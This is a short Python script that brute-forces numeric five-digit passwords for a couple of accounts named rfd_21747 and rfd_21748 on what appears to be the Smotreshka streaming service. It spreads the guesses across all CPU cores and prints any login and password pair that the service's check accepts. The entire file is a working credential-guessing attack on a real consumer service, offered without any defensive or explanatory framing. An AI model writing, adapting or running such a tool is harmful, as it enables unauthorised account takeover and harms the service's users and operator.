import Smotreshka
import multiprocessing


def process(procs, calc):
    # procs - количество ядер
    # calc - количество операций на ядро

    for id_login in range(21747, 21749):

        processes = []

        for proc in range(procs):
            p = multiprocessing.Process(target=start_parse, args=(calc, proc, id_login))
            processes.append(p)
            p.start()

        for p in processes:
            p.join()


def start_parse(calc, proc, id_login):
    login = f'rfd_{id_login}'
    # password = 00000

    index_start = (proc - 1) * calc
    index_stop = proc * calc
    for password in range(index_start, index_stop):
        sm = Smotreshka.Smotreshka(login, f'{password:05}')
        if sm.check():
            print(f"SUCCESS {login} - {password:05}")
            break


if __name__ == '__main__':
    n_proc = multiprocessing.cpu_count()

    calc = 100000 // n_proc + 1
    process(n_proc, calc)
